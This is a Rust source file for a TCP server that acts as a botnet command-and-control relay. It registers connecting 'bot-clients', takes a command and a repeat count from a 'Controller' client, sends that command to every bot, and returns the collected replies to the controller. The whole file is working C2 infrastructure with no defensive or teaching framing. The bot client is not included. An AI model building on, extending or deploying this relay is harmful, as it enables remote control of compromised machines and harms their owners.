use std::net::SocketAddr;

use clap::Parser;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    // ip: the server ip
    #[arg(short, long)]
    ip: String,

    // port: the port where own server will be running
    #[arg(short, long)]
    port: u16,
}

fn data_parser(data: String) -> Vec<String> {
    let mut request: Vec<String> = Vec::new();

    for key in data.split("|") {
        request.push(key.to_string());
    }

    request
}

// get the data format
async fn get_data(socket: &mut TcpStream) -> Vec<String> {
    let mut buffer = [0u8; 1024];
    let n = socket.read(&mut buffer).await.unwrap();
    let request = String::from_utf8_lossy(&buffer[..n]);

    let data = data_parser(request.to_string());

    data
}

// if the client type is controller return true, else return false.
fn is_controller_client(data: &Vec<String>) -> bool {
    match data.get(0) {
        Some(client_type) if *client_type == "Controller".to_string() => {
            println!("I am the controller");
            true
        }
        _ => {
            eprintln!("error");
            false
        }
    }
}

#[tokio::main]
async fn main() {
    // parsing the agruments
    let args = Args::parse();

    // vector of all sockets connected to the server
    let mut connections: Vec<(TcpStream, SocketAddr)> = Vec::new();

    // parse the direcction addrs
    let addr = format!("{}:{}", args.ip, args.port);

    // init the server
    let listener = match TcpListener::bind(addr).await {
        Ok(listener) => {
            println!("the server is running...");
            listener
        }
        Err(e) => {
            eprintln!("{:?}", e);
            return;
        }
    };

    // main loop
    loop {
        // accepting the connections into the server and handling errors
        let (mut socket, addr) = match listener.accept().await {
            Ok((socket, addr)) => {
                println!("[{addr}] ==> connected");
                (socket, addr)
            }
            Err(e) => {
                eprintln!("{:?}", e);
                return;
            }
        };

        // getting the data of the socket
        let data = get_data(&mut socket).await;

        // logic when the controller client submit an order.
        if is_controller_client(&data) {
            println!("{:?}", data);
            println!("{:?}", connections);

            // response container of the bot clients
            let mut response_container = String::new();

            // handling the all connexions of bot-clients
            for (stream, addr) in connections.iter_mut() {
                /*  
                 * 
                 * CONTROLLER-CLIENT
                 * ====================================
                 * 0: type_client, 1: command, 2: times
                 * ====================================
                 * 
                 * BOT-CLIENT
                 * =====================================
                 * 0: type_cient, 1: status, 2: response
                 * =====================================
                 */
                if let Some(times) = data.get(2) {
                    let mut counter = 0;
                    let counter_generator: i32 = times.parse::<i32>().unwrap();

                    while counter != counter_generator {
                        // send the orders
                        if let Some(command) = data.get(1) {
                            stream.write_all(command.as_bytes()).await.unwrap();
                            // buffer for content the data
                            let mut buffer = [0u8; 1024];
            
                            // n size of buffer
                            let n = match stream.read(&mut buffer).await {
                                Ok(n) if n == 0 => continue,
                                Ok(n) => n,
                                Err(e) => {
                                    eprintln!("{:?}", e);
                                    continue;
                                }
                            };
                            // parsing the data
                            let data = String::from_utf8_lossy(&buffer[..n]);
                            let response = format!("\n[{:?}]\n{data}", addr);
                            response_container.push_str(&response);
                        }

                        counter += 1;
                    }
                    
                }

            }

            // sending the data form the bot-clients to the controller-client
            socket
                .write_all(response_container.as_bytes())
                .await
                .unwrap();
        } else {
            // pushing the sockets into the connections vector  
            connections.push((socket, addr));
        }
    }
}

#[test]
fn parse_request() {
    let a = data_parser("Controller|elpepe|fulanito".to_string());

    assert_eq!(
        a,
        vec![
            "Controller".to_string(),
            "elpepe".to_string(),
            "fulanito".to_string()
        ]
    )
}
